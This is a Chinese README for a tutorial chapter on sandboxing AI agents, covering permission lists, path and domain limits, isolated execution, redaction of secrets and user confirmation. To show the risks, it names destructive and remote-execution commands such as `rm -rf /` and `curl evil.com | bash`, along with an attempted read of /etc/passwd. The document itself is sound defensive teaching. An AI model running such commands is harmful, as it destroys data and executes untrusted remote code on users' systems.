# 10 - Sandbox（权限控制 + 安全执行）

## 为什么需要权限控制？

Agent 能调用工具、读写文件、执行命令 — 权限太大了。没有约束的 Agent 就像给了 root 权限的脚本，随时可能：

1. **误删文件** — `rm -rf /` 这种事 Agent 真的会干
2. **泄露敏感信息** — 读到 API key、密码然后输出到对话里
3. **执行危险命令** — `curl evil.com | bash`
4. **越权访问** — 读取不该读的文件、访问内部网络

## 核心问题

```
用户：帮我清理一下临时文件
Agent：好的，我来执行 rm -rf /tmp/*
结果：/tmp 下有其他进程的重要临时文件，全没了
```

Agent 不理解"上下文中的危险"，需要外部机制来约束。

## 解决方案层次

```
┌─────────────────────────────────────────────────┐
│                  用户确认层                       │
│  危险操作前暂停，等用户确认（confirm before exec） │
├─────────────────────────────────────────────────┤
│                  权限控制层                       │
│  工具白名单 / 文件路径限制 / 网络域名限制         │
├─────────────────────────────────────────────────┤
│                  沙箱执行层                       │
│  危险操作在隔离环境执行（临时目录 / 容器）        │
├─────────────────────────────────────────────────┤
│                  信息过滤层                       │
│  敏感信息自动脱敏（API key / 密码 / 个人数据）    │
└─────────────────────────────────────────────────┘
```

## 文件结构

```
10-sandbox/
├── README.md           ← 本文件
├── permissions.ts      # 权限管理器：工具白名单 + 路径/域名限制
├── sandbox.ts          # 沙箱执行器：隔离环境执行危险操作
├── sanitizer.ts        # 敏感信息过滤器：自动脱敏
├── confirm.ts          # 用户确认机制：危险操作前暂停
├── wrapper.ts          # 工具包装器：给现有工具加权限层
└── chat.ts             # 交互入口：演示各种权限场景
```

## 设计要点

### 1. 权限管理器（permissions.ts）

```typescript
interface PermissionConfig {
  // 工具权限
  allowedTools: string[];      // 白名单（空=全部允许）
  blockedTools: string[];      // 黑名单

  // 文件系统权限
  allowedPaths: string[];      // 允许访问的路径前缀
  blockedPaths: string[];      // 禁止访问的路径

  // 网络权限
  allowedDomains: string[];    // 允许访问的域名
  blockedDomains: string[];    // 禁止访问的域名

  // 危险级别
  requireConfirm: string[];    // 需要确认的操作（工具名）
}

class PermissionManager {
  checkToolAccess(toolName: string): PermissionResult;
  checkPathAccess(path: string): PermissionResult;
  checkNetworkAccess(url: string): PermissionResult;
}
```

### 2. 沙箱执行器（sandbox.ts）

```typescript
// 方案 A：临时目录隔离（简单）
class TmpDirSandbox {
  execute(fn: () => Promise<T>): Promise<T>;
  // 在临时目录执行，结束后清理
}

// 方案 B：进程隔离（中等）
class ProcessSandbox {
  execute(command: string): Promise<ExecResult>;
  // 用 chroot/namespace 隔离
}

// 方案 C：容器隔离（完整）
class ContainerSandbox {
  execute(image: string, command: string): Promise<ExecResult>;
  // 用 Docker/Podman 隔离
}
```

### 3. 敏感信息过滤（sanitizer.ts）

```typescript
class Sanitizer {
  // 检测敏感信息
  detect(text: string): SensitiveMatch[];

  // 脱敏替换
  sanitize(text: string): string;
  // "my api key is sk-abc123" → "my api key is [REDACTED]"

  // 自定义规则
  addRule(pattern: RegExp, replacement: string): void;
}
```

### 4. 用户确认（confirm.ts）

```typescript
class ConfirmMiddleware {
  // 包装工具，危险操作前暂停
  wrap(tool: Tool, config: { requireConfirm: boolean }): Tool;
  // Agent 调用 → 暂停 → 显示操作详情 → 用户确认 → 执行/取消
}
```

## Demo 场景

1. **路径限制** — Agent 只能读写 `/tmp/agent-workspace/`，尝试读 `/etc/passwd` 被拦截
2. **工具黑名单** — 禁用 `exec` 工具，Agent 无法执行命令
3. **敏感信息** — Agent 读到包含 API key 的文件，输出时自动脱敏
4. **用户确认** — Agent 要删除文件，弹出确认提示

## 与前面章节的关系

- **02-tool-system**：sandbox 包装现有工具，不改变工具定义
- **08-sub-agent**：sub-agent 天然有工具过滤，sandbox 是更完整的方案
- **09-multi-agent**：peer-agent 之间的通信也可以加权限控制

## 实现优先级

1. ✅ permissions.ts — 最基础，先做
2. ✅ sanitizer.ts — 敏感信息过滤，实用
3. ✅ confirm.ts — 用户确认，交互关键
4. ⬜ sandbox.ts — 沙箱执行，可选（临时目录方案够用）
